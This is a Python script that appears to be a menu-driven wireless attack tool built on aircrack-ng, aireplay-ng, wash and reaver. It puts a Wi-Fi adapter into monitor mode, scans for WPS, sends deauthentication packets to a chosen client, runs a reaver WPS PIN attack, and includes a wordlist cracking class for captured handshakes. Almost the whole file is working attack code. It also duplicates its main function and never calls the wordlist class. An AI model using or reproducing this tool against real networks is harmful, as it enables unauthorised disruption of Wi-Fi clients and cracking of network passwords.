import subprocess
import re
import argparse


class WordlistAttackTool:
    def __init__(self, handshake_file, wordlist_file):
        self.handshake_file = handshake_file
        self.wordlist_file = wordlist_file

    def run_wordlist_attack(self):
        """Perform wordlist attack using aircrack-ng"""
        print("Performing wordlist attack...")

        # Start wordlist attack using aircrack-ng
        cmd = ["aircrack-ng", self.handshake_file, '-w', self.wordlist_file]
        subprocess.call(cmd)

        print("Wordlist attack completed.")


class WirelessSecurityTool:
    def __init__(self, adapter):
        self.adapter = adapter

    def enable_monitor_mode(self):
        """Enable monitor mode"""
        print(f"Changing {self.adapter} to monitor mode")
        subprocess.run(["ifconfig", self.adapter, "down"])
        subprocess.run(["iwconfig", self.adapter, "mode", "monitor"])
        subprocess.run(["ifconfig", self.adapter, "up"])

    def check_wps(self):
        """Check for WPS enabled"""
        print(f"Using {self.adapter} to check for WPS")
        subprocess.run(["wash", "--interface", self.adapter])

    def deauth_attack(self, client_bssid, deauth_pack, client_mac):
        '''Deauth attack function'''
        print(f'Deauth attack against {client_bssid} on {client_mac} using {self.adapter}')
        subprocess.run(
            ['aireplay-ng', '--deauth', str(deauth_pack), '-a', client_bssid, '-c', client_mac, self.adapter],
            check=True)

    def capture_handshake(self):
        """Capture WPA handshake"""
        print("Capturing handshake")
        wifi_mac = input("[+] Input Wi-Fi MAC address: ")
        result = subprocess.check_output(["ifconfig", self.adapter], encoding="utf-8")
        output = re.search(r"([A-Za-z0-9]+(-[A-Za-z0-9]+)+)", result)
        print(output[0])
        adapter_mac = input("[+] Input adapter MAC: ")
        channel = input("[+] Input channel of Wi-Fi network: ")

        client_bssid = input("[+] Input client BSSID: ")
        deauth_pack = int(input("[+] Input number of deauth packets: "))
        client_mac = input("[+] Input client MAC address: ")

        self.deauth_attack(client_bssid, deauth_pack, client_mac)

        subprocess.run(['reaver', '--bssid', wifi_mac, '--channel', channel, '--interface', self.adapter, '-vvv',
                        '--no-associate'])
        subprocess.run(['aireplay-ng', '-1', '30', '-a', wifi_mac, '-h', adapter_mac, self.adapter])

    def run_wireless_security_tool(self):
        user_selection = self.get_user_selection()

        if user_selection == '1':
            try:
                self.enable_monitor_mode()
                self.check_wps()
            except KeyboardInterrupt:
                pass

        elif user_selection == '2':
            try:
                self.capture_handshake()
            except KeyboardInterrupt:
                pass

    @staticmethod
    def get_user_selection():
        print("[+] Which action do you want to perform:")
        print("1. Check for WPS")
        print("2. Capture Handshake")
        return input("Selection: ")


def main():
    adapter = input("[+] Input Wi-Fi adapter: ")
    tool = WirelessSecurityTool(adapter)
    tool.run_wireless_security_tool()


if __name__ == "__main__":
    main()


def main():
    adapter = input("[+] Input Wi-Fi adapter: ")
    tool = WirelessSecurityTool(adapter)
    tool.run_wireless_security_tool()


if __name__ == "__main__":
    main()
